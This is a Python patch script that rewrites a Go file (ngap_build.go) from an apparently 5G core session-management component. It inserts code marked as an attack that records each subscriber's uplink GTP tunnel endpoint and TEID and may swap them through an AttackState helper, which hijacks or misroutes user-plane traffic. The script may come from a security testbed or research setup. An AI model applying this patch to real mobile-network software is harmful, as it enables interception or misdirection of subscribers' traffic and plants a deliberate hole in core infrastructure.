import re
import sys

filepath = sys.argv[1]
with open(filepath, 'r') as f:
    content = f.read()

# -----------------------------------------------------------------------
# PATCH 1: In BuildPDUSessionResourceSetupRequestTransfer, after extracting
#   the n3IP and teidOct, intercept them with the attack swap logic.
#
# We replace the UL NG-U UP TNL Information block to use swapped values.
# -----------------------------------------------------------------------

# Find the original UL NG-U UP TNL Information block and replace it
old_block = '''	// UL NG-U UP TNL Information
	ie = ngapType.PDUSessionResourceSetupRequestTransferIEs{}
	ie.Id.Value = ngapType.ProtocolIEIDULNGUUPTNLInformation
	ie.Criticality.Value = ngapType.CriticalityPresentReject
	if n3IP, err := UpNode.N3Interfaces[0].IP(ctx.SelectedPDUSessionType); err != nil {
		return nil, err
	} else {
		ie.Value = ngapType.PDUSessionResourceSetupRequestTransferIEsValue{
			Present: ngapType.PDUSessionResourceSetupRequestTransferIEsPresentULNGUUPTNLInformation,
			ULNGUUPTNLInformation: &ngapType.UPTransportLayerInformation{
				Present: ngapType.UPTransportLayerInformationPresentGTPTunnel,
				GTPTunnel: &ngapType.GTPTunnel{
					TransportLayerAddress: ngapType.TransportLayerAddress{
						Value: aper.BitString{
							Bytes:     n3IP,
							BitLength: uint64(len(n3IP) * 8),
						},
					},
					GTPTEID: ngapType.GTPTEID{Value: teidOct},
				},
			},
		}
	}'''

new_block = '''	// UL NG-U UP TNL Information
	// >>> ATTACK: Intercept and potentially swap the UL tunnel info <<<
	ie = ngapType.PDUSessionResourceSetupRequestTransferIEs{}
	ie.Id.Value = ngapType.ProtocolIEIDULNGUUPTNLInformation
	ie.Criticality.Value = ngapType.CriticalityPresentReject
	if n3IP, err := UpNode.N3Interfaces[0].IP(ctx.SelectedPDUSessionType); err != nil {
		return nil, err
	} else {
		// ATTACK: Record original and get (possibly swapped) tunnel info
		swappedTEID, swappedIP, wasSwapped := AttackState.RecordAndSwap(
			ctx.LocalULTeid, n3IP, ctx.Supi)
		if wasSwapped {
			n3IP = swappedIP
			teidOct = swappedTEID
		}
		// >>> END ATTACK <<<
		ie.Value = ngapType.PDUSessionResourceSetupRequestTransferIEsValue{
			Present: ngapType.PDUSessionResourceSetupRequestTransferIEsPresentULNGUUPTNLInformation,
			ULNGUUPTNLInformation: &ngapType.UPTransportLayerInformation{
				Present: ngapType.UPTransportLayerInformationPresentGTPTunnel,
				GTPTunnel: &ngapType.GTPTunnel{
					TransportLayerAddress: ngapType.TransportLayerAddress{
						Value: aper.BitString{
							Bytes:     n3IP,
							BitLength: uint64(len(n3IP) * 8),
						},
					},
					GTPTEID: ngapType.GTPTEID{Value: teidOct},
				},
			},
		}
	}'''

if old_block in content:
    content = content.replace(old_block, new_block)
    print("  [OK] Patched UL NG-U UP TNL Information block")
else:
    print("  [WARN] Could not find exact UL NG-U UP TNL block — may already be patched or source differs")
    # Try a more lenient match
    if 'ATTACK' not in content:
        print("  [ERROR] Patch failed — manual intervention needed")
        sys.exit(1)

with open(filepath, 'w') as f:
    f.write(content)

print("  [OK] ngap_build.go patched successfully")
